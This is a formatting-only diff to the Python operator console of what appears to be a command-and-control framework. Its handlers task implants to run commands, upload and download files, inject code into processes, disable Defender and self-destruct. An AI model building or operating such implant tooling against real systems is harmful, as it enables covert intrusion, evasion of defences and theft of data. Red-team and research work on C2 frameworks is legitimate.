@@ -13,7 +13,13 @@ from config import OperatorConfig
 from .completer import InteractCompleter
 from .commands import INTERACT_COMMANDS, COMMANDS, walk_dict
 from .logging import get_styled_logger
-from comms import add_task, get_implant_profile, get_task_result, kill_implant, update_implant_profile
+from comms import (
+    add_task,
+    get_implant_profile,
+    get_task_result,
+    kill_implant,
+    update_implant_profile,
+)
 from opcodes import Opcodes
 
 logger = get_styled_logger()
@@ -45,7 +51,9 @@ def interact_prompt(config: OperatorConfig, implant_id: str):
             break
 
 
-def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -> None | bool:
+def handle(
+    cmd: str, args: List[str], config: OperatorConfig, implant_id: str
+) -> None | bool:
     """
     Handle a command
     """
@@ -117,7 +125,9 @@ def handle_exit(config: OperatorConfig) -> None:
     Handle the exit command, jump back to the main loop
     """
     from .cli import main_loop
+
     main_loop(config)
+
 
 def handle_cmd(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
@@ -130,14 +140,14 @@ def handle_cmd(config: OperatorConfig, implant_id: str, args: List[str]) -> None
     logger.info(f"Sending command `{' '.join(args)}` to {implant_id}")
     add_task(config, Opcodes.CMD.value, implant_id, args)
 
-def handle_config(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
 
+def handle_config(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     if len(args) < 2:
         logger.error("Please provide an action to perform and a key")
         return
     action, key = args[0], args[1]
     changes = {}
-    valid_keys = [k.split(' ')[0] for k in INTERACT_COMMANDS['config']['set'].keys()]
+    valid_keys = [k.split(" ")[0] for k in INTERACT_COMMANDS["config"]["set"].keys()]
 
     if action == "set":
         if len(args) < 3:
@@ -158,14 +168,27 @@ def handle_config(config: OperatorConfig, implant_id: str, args: List[str]) -> N
             return
         implant_config = get_implant_profile(config, implant_id)
         if key == "all":
-            print(tabulate(implant_config.items(), headers=["Key", "Value"], tablefmt="fancy_grid"))
-        elif key in INTERACT_COMMANDS['config']['show']:
-            print(tabulate([[key, implant_config[key]]], headers=["Key", "Value"], tablefmt="fancy_grid"))
+            print(
+                tabulate(
+                    implant_config.items(),
+                    headers=["Key", "Value"],
+                    tablefmt="fancy_grid",
+                )
+            )
+        elif key in INTERACT_COMMANDS["config"]["show"]:
+            print(
+                tabulate(
+                    [[key, implant_config[key]]],
+                    headers=["Key", "Value"],
+                    tablefmt="fancy_grid",
+                )
+            )
         else:
             logger.error(f"Invalid key {key}")
     else:
         logger.error("Invalid action, must be set or show")
         return
+
 
 def handle_selfdestruct(config: OperatorConfig, implant_id: str) -> None:
     """
@@ -179,6 +202,7 @@ def handle_selfdestruct(config: OperatorConfig, implant_id: str) -> None:
 ## Helper functions
 ################################
 
+
 def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
     if key == "user_agent":
         return True, value
@@ -190,7 +214,7 @@ def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
             return False, None
     elif key == "kill_date":
         try:
-            return True, datetime.datetime.strptime(value, '%Y-%m-%d')
+            return True, datetime.datetime.strptime(value, "%Y-%m-%d")
         except ValueError:
             logger.error("Kill date must be in the format YYYY-MM-DD")
             return False, None
@@ -237,8 +261,9 @@ def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
     else:
         logger.error(f"Invalid key {key}")
         return False, None
-    
+
     return False, None
+
 
 def handle_sysinfo(config: OperatorConfig, implant_id: str) -> None:
     """
@@ -247,12 +272,15 @@ def handle_sysinfo(config: OperatorConfig, implant_id: str) -> None:
     logger.debug(f"Sending sysinfo task to {implant_id}")
     add_task(config, Opcodes.SYSINFO.value, implant_id, [])
 
+
 def handle_result(config: OperatorConfig, args: List[str]) -> None:
     """
     Handle the result command, get the results of a task
     """
     from .command import handle_result
+
     handle_result(config, args)
+
 
 def handle_sleep(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
@@ -270,6 +298,7 @@ def handle_sleep(config: OperatorConfig, implant_id: str, args: List[str]) -> No
     logger.debug(f"Sending sleep task to {implant_id}")
     add_task(config, Opcodes.SLEEP.value, implant_id, int(seconds))
 
+
 def handle_download(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
     Handle the download command, send a download task to the implant.
@@ -283,6 +312,7 @@ def handle_download(config: OperatorConfig, implant_id: str, args: List[str]) ->
     logger.debug(f"Sending download task to {implant_id}")
     add_task(config, Opcodes.DOWNLOAD.value, implant_id, path)
 
+
 def handle_upload(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
     Handle the upload command, send an upload task to the implant
@@ -293,19 +323,19 @@ def handle_upload(config: OperatorConfig, implant_id: str, args: List[str]) -> N
 
     local_path = args[0]
     remote_path = args[1]
-    
+
     # See if file exists and is not a directory
     if not os.path.isfile(local_path):
         logger.error(f"File {local_path} does not exist")
         return
-    
+
     # Encode file contents as base64
     with open(local_path, "rb") as f:
         file_contents = base64.b64encode(f.read()).decode()
-    
 
     logger.debug(f"Sending upload task to {implant_id}")
     add_task(config, Opcodes.UPLOAD.value, implant_id, [remote_path, file_contents])
+
 
 def handle_inject(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
@@ -319,7 +349,7 @@ def handle_inject(config: OperatorConfig, implant_id: str, args: List[str]) -> N
 
     file_path = args[0]
     process_name = args[1]
-    
+
     if not os.path.isfile(file_path):
         logger.error(f"File {file_path} does not exist")
         return
@@ -330,6 +360,7 @@ def handle_inject(config: OperatorConfig, implant_id: str, args: List[str]) -> N
 
     logger.debug(f"Sending inject task to {implant_id}")
     add_task(config, Opcodes.INJECT.value, implant_id, [file_contents, process_name])
+
 
 def handle_cd(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
@@ -343,6 +374,7 @@ def handle_cd(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     logger.debug(f"Sending cd task to {implant_id}")
     add_task(config, Opcodes.CHDIR.value, implant_id, directory)
 
+
 def handle_ls(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
     Handle the ls command, send an ls task to the implant
@@ -354,12 +386,14 @@ def handle_ls(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     logger.debug(f"Sending ls task to {implant_id}")
     add_task(config, Opcodes.LS.value, implant_id, None)
 
+
 def handle_pwd(config: OperatorConfig, implant_id: str) -> None:
     """
     Handle the pwd command, send a pwd task to the implant
     """
     logger.debug(f"Sending pwd task to {implant_id}")
     add_task(config, Opcodes.PWD.value, implant_id, None)
+
 
 def handle_ls(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     """
@@ -368,12 +402,14 @@ def handle_ls(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
     logger.debug(f"Sending ls task to {implant_id}")
     add_task(config, Opcodes.LS.value, implant_id, None)
 
+
 def handle_getenv(config: OperatorConfig, implant_id: str) -> None:
     """
     Handle the getenv command, send a getenv task to the implant
     """
     logger.debug(f"Sending getenv task to {implant_id}")
     add_task(config, Opcodes.GETENV.value, implant_id, None)
+
 
 def handle_ps(config: OperatorConfig, implant_id: str) -> None:
     """
@@ -382,12 +418,14 @@ def handle_ps(config: OperatorConfig, implant_id: str) -> None:
     logger.debug(f"Sending ps task to {implant_id}")
     add_task(config, Opcodes.PS.value, implant_id, None)
 
+
 def handle_whoami(config: OperatorConfig, implant_id: str) -> None:
     """
     Handle the whoami command, send a whoami task to the implant
     """
     logger.debug(f"Sending whoami task to {implant_id}")
     add_task(config, Opcodes.WHOAMI.value, implant_id, None)
+
 
 def handle_disable_defender(config: OperatorConfig, implant_id: str) -> None:
     """
